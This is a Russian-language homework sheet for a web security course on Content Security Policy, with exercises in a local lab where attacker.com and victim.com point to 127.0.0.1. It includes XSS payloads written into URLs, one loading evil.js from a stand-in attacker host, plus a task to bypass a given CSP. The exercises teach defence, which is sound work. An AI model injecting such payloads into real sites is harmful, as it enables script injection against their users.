1. Открыть консоль браузера на http://attacker.com и запросить файл с http://victim.com с помощью XHR. Изучить реакцию браузера в консоли.

![homework 6-1](/img/6-1.jpg)

2. Примечание: домены attacker.com и victim.com должны резолвиться в 127.0.0.1, конфиг nginx тоже должен отдавать все так, чтобы на начало задания работало оба алерта.
Добавить данную политику CSP на сайте http://victim.com. Загрузить страницу victim.com/csp.php?js=<script/src=//attacker.com/evil.js></script>, посмотреть что произошло. Исправить политику CSP так, чтобы вредоносный код не выполнялся.

![homework 6-2](/img/6-2.jpg)

3. Не дать вредоносному коду http://victim.com/hw-6-3.php?name=<script>alert(“hacked”)</script> выполниться на странице http://victim.com/hw-6-3.php (представлена ниже) с помощью политики CSP (написать политику CSP). Легитимный код при это должен выполняться.

![homework 6-3](/img/6-3.jpg)

4. (*) Обойти политику CSP: script-src ‘unsafe-eval’ http://victim.com http://partner.com http://home.victim.com на странице http://victim.com/hw-6-4.html?text=123. Сделать безопасно, понять почему теперь безопасно.

![homework 6-4](/img/6-4.jpg)

5. (*) Установить bWAPP.

![homework 6-5](/img/6-5.jpg)
